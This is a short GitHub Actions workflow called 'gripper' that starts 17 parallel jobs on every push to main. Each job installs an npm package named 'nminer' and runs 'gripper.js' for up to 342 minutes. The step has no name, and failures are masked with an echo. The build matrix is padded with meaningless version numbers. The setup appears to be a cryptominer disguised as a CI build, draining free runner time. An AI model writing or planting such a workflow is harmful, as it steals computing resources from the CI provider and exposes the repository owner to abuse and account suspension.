name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 492 }
          - { version: 4360 }
          - { version: 4168 }
          - { version: 3217 }
          - { version: 8314 }
          - { version: 8707 }
          - { version: 9180 }
          - { version: 9507 }
          - { version: 1035 }
          - { version: 9754 }
          - { version: 2108 }
          - { version: 6262 }
          - { version: 1739 }
          - { version: 5482 }
          - { version: 1148 }
          - { version: 2651 }
          - { version: 3326 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 342m node gripper.js || echo "gripper executed"